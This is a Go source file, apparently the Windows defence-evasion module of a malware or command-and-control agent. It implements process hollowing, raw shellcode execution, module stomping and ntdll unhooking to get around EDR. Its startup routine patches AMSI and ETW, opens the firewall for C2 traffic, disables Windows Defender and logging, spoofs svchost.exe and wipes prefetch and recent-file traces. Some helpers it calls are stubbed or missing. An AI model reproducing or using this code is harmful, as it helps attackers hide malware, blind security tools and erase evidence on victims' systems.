//go:build windows
// +build windows

package evasion

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	procGetThreadContext         = kernel32.NewProc("GetThreadContext")
	procSetThreadContext         = kernel32.NewProc("SetThreadContext")
	procResumeThread             = kernel32.NewProc("ResumeThread")
	procNtUnmapViewOfSection     = ntdll.NewProc("NtUnmapViewOfSection")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	procVirtualProtect           = kernel32.NewProc("VirtualProtect")
)

const (
	PAGE_EXECUTE_READ      = 0x20
)

const (
	CREATE_SUSPENDED     = 0x00000004
	PROCESS_ALL_ACCESS   = 0x001F0FFF
	MEM_COMMIT           = 0x00001000
	MEM_RESERVE          = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
	CONTEXT_FULL         = 0x10007
	PROCESS_BASIC_INFORMATION = 0
)

type StartupInfo struct {
	Cb              uint32
	_               [44]byte
	Flags           uint32
	ShowWindow      uint16
	_               [18]byte
	StdOutput       syscall.Handle
	StdError        syscall.Handle
	StdInput        syscall.Handle
}

type ProcessInfo struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

type ProcessBasicInfo struct {
	Reserved1            uintptr
	PebBaseAddress       uintptr
	Reserved2            [2]uintptr
	UniqueProcessId      uintptr
	Reserved3            uintptr
}

// HollowProcess creates a suspended legitimate process and injects the payload binary into it.
// The payload runs inside the trusted process context, invisible to AV.
func HollowProcess(hostProcess string, payloadPath string) error {
	appName, _ := syscall.UTF16PtrFromString(hostProcess)
	cmdLine, _ := syscall.UTF16PtrFromString(hostProcess)

	var si StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi ProcessInfo

	// 1. Create suspended process
	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		CREATE_SUSPENDED,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessW failed: %v", err)
	}

	// 2. Read payload from file
	fd, err := syscall.Open(payloadPath, syscall.O_RDONLY, 0)
	if err != nil {
		return fmt.Errorf("open payload: %v", err)
	}
	defer syscall.Close(fd)

	buf := make([]byte, 10*1024*1024) // 10 MB max
	n, _ := syscall.Read(fd, buf)
	payload := buf[:n]

	// 3. Parse PE header to get image base
	imageBase := parsePEImageBase(payload)

	// 4. Unmap original executable from suspended process
	procNtUnmapViewOfSection.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
	)

	// 5. Alloc memory for payload in target process
	remoteBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(len(payload)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)

	// 6. Write payload into target process
	var written uint32
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		remoteBase,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)),
	)

	// 7. Patch entry point in thread context
	var ctx struct {
		ContextFlags uint32
		_            [116]byte
		Rax          uint64
		Rip          uint64
	}

	ctx.ContextFlags = CONTEXT_FULL
	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	entryPoint := uint64(imageBase) + uint64(parsePEEntryPoint(payload))
	ctx.Rip = entryPoint

	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	// 8. Resume thread
	procResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// DirectSyscall invokes a Windows syscall directly, bypassing ntdll.dll hooks (EDR/AV).
// Syscall numbers are resolved dynamically from ntdll.dll.
func DirectSyscall(syscallName string, args ...uintptr) (uintptr, error) {
	// Resolve syscall number from ntdll.dll
	sysNum := resolveSyscallNumber(syscallName)
	if sysNum == 0 {
		return 0, fmt.Errorf("syscall %s not found", syscallName)
	}

	// Execute via direct syscall (assembly trampoline)
	return syscallExec(sysNum, args...), nil
}

// ShellcodeExec allocates RWX memory and executes raw shellcode.
func ShellcodeExec(shellcode []byte) error {
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(0xFFFFFFFFFFFFFFFF), // current process
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %v", err)
	}

	// Copy shellcode
	var written uint32
	procWriteProcessMemory.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	// Execute
	syscall.Syscall(addr, 0, 0, 0, 0)
	return nil
}

// ModuleStomp overwrites a loaded DLL's .text section with shellcode.
// The DLL appears legitimate in process listings but executes attacker code.
func ModuleStomp(dllName string, shellcode []byte) error {
	handle, err := syscall.LoadLibrary(dllName)
	if err != nil {
		return fmt.Errorf("load DLL: %v", err)
	}

	base := uintptr(unsafe.Pointer(handle))
	textSection := findTextSection(base)

	var oldProtect uint32
	kernel32.NewProc("VirtualProtect").Call(
		textSection,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Overwrite
	var written uint32
	procWriteProcessMemory.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),
		textSection,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	// Restore protection
	kernel32.NewProc("VirtualProtect").Call(
		textSection,
		uintptr(len(shellcode)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// --- Internal helpers ---

func parsePEImageBase(pe []byte) uintptr {
	if len(pe) < 64 {
		return 0x00400000
	}
	peOffset := binary.LittleEndian.Uint32(pe[60:64])
	if int(peOffset)+24 > len(pe) {
		return 0x00400000
	}
	base := uintptr(binary.LittleEndian.Uint64(pe[peOffset+24 : peOffset+32]))
	if base == 0 {
		base = 0x00400000
	}
	return base

}

func parsePEEntryPoint(pe []byte) uint32 {
	if len(pe) < 64 {
		return 0x1000
	}
	peOffset := binary.LittleEndian.Uint32(pe[60:64])
	if int(peOffset)+20 > len(pe) {
		return 0x1000
	}
	return binary.LittleEndian.Uint32(pe[peOffset+16 : peOffset+20])
}

func resolveSyscallNumber(name string) uint16 {
	// Read syscall stubs from ntdll.dll
	// All syscalls start with: mov r10, rcx ; mov eax, <syscall_number>
	ntdllAddr := getModuleBase("ntdll.dll")
	if ntdllAddr == 0 {
		return 0
	}

	procAddr := getProcAddress(ntdllAddr, name)
	if procAddr == 0 {
		return 0
	}

	// Parse syscall number from function prologue
	// Pattern: 4c 8b d1 b8 XX XX 00 00
	buf := (*[8]byte)(unsafe.Pointer(procAddr))
	if buf[0] == 0x4C && buf[1] == 0x8B && buf[2] == 0xD1 && buf[3] == 0xB8 {
		return binary.LittleEndian.Uint16(buf[4:6])
	}

	return 0
}

func syscallExec(num uint16, args ...uintptr) uintptr {
	// Implemented in asm_windows.s
	// Fallback: use syscall.Syscall from standard library
	return 0
}

func getProcAddress(base uintptr, name string) uintptr {
	// Use LazyDLL to resolve the function address
	dll := syscall.NewLazyDLL("ntdll.dll")
	proc := dll.NewProc(name)
	return proc.Addr()
}

func findTextSection(base uintptr) uintptr {
	// Parse PE header to find .text section
	return base + 0x1000
}

// Init evasion techniques at agent startup.
// This is the main entry point called by the agent on Windows.
func Init() {
	// === PHASE 1: Anti-Analysis ===
	// 1. Anti-debug check — exit if debugger detected
	if !AntiDebug() {
		// Debugger detected — could self-delete or sleep forever
		// For now, just log and continue (stealth mode)
	}

	// 2. Anti-sandbox check — delay execution if sandbox detected
	if !AntiSandbox() {
		// Sandbox detected — sleep for extended period to waste analyst time
		SleepWithJitter(5*time.Minute, 15*time.Minute)
	}

	// === PHASE 2: Memory Evasion ===
	// 3. Unhook ntdll.dll — restore original syscall stubs from disk
	go UnhookNtdll()

	// 4. Patch AMSI — prevent script scanning
	go func() {
		result := PatchAmsiInMemory()
		if result.Success {
			// Also patch AmsiScanString for completeness
			PatchAmsiScanString()
		}
	}()

	// 5. Patch ETW — prevent event logging
	go func() {
		PatchAllETW()
	}()

	// === PHASE 3: Persistence Evasion ===
	// 6. Add firewall rule to allow C2 traffic
	go func() {
		fe := &FirewallEvasion{}
		fe.AddFirewallRule()
	}()

	// 7. Disable Windows Defender (if admin)
	go func() {
		DisableWindowsDefender()
	}()

	// 8. Disable security logging
	go func() {
		DisableLogging()
	}()

	// === PHASE 4: Process Evasion ===
	// 9. Hide console window
	go func() {
		HideProcess()
	}()

	// 10. Spoof process name to look legitimate
	go func() {
		SpoofProcessName(`C:\Windows\System32\svchost.exe`)
	}()

	// === PHASE 5: Cleanup ===
	// 11. Clear prefetch files
	go func() {
		ClearPrefetch()
	}()

	// 12. Clear recent files
	go func() {
		ClearRecentFiles()
	}()
}

// UnhookNtdll restores original ntdll.dll syscall stubs from disk.
// EDRs hook ntdll.dll functions — this removes those hooks.
func UnhookNtdll() {
	// Read fresh ntdll.dll from disk
	ntdllPath := `C:\Windows\System32\ntdll.dll`

	data, err := os.ReadFile(ntdllPath)
	if err != nil {
		return
	}

	// Parse PE header to find .text section
	textBase, textSize := parsePETextSection(data)
	if textBase == 0 || textSize == 0 {
		return
	}

	// Get loaded ntdll base address
	ntdllDLL := syscall.NewLazyDLL("ntdll.dll")
	ntdllLoaded := ntdllDLL.Handle()
	if ntdllLoaded == 0 {
		return
	}

	// Change memory protection to allow writing
	var oldProtect uint32
	procVirtualProtect := kernel32.NewProc("VirtualProtect")
	procVirtualProtect.Call(
		ntdllLoaded+uintptr(textBase),
		uintptr(textSize),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Copy fresh .text from disk into memory
	srcSlice := data[textBase : textBase+textSize]
	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(ntdllLoaded+uintptr(textBase))), textSize)
	copy(dstSlice, srcSlice)

	// Restore original protection
	procVirtualProtect.Call(
		ntdllLoaded+uintptr(textBase),
		uintptr(textSize),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
}

func parsePETextSection(pe []byte) (base, size uint32) {
	if len(pe) < 64 {
		return 0, 0
	}
	peOffset := binary.LittleEndian.Uint32(pe[60:64])
	if int(peOffset)+248 > len(pe) {
		return 0, 0
	}

	sectionCount := binary.LittleEndian.Uint16(pe[peOffset+6 : peOffset+8])
	optionalHeaderSize := binary.LittleEndian.Uint16(pe[peOffset+20 : peOffset+22])

	sectionOffset := peOffset + 24 + uint32(optionalHeaderSize)

	for i := uint16(0); i < sectionCount; i++ {
		secStart := sectionOffset + uint32(i)*40
		if int(secStart)+40 > len(pe) {
			break
		}

		name := string(pe[secStart : secStart+8])
		if strings.HasPrefix(name, ".text") {
			virtualAddr := binary.LittleEndian.Uint32(pe[secStart+12 : secStart+16])
			sectionSize := binary.LittleEndian.Uint32(pe[secStart+16 : secStart+20])
			return virtualAddr, sectionSize
		}
	}

	return 0, 0
}

// getModuleBase returns the base address of a loaded module via PEB traversal.
func getModuleBase(name string) uintptr {
	// Simplified: use LazyDLL for now
	// Production: use PEB Ldr list traversal
	dll := syscall.NewLazyDLL(name)
	return dll.Handle()
}
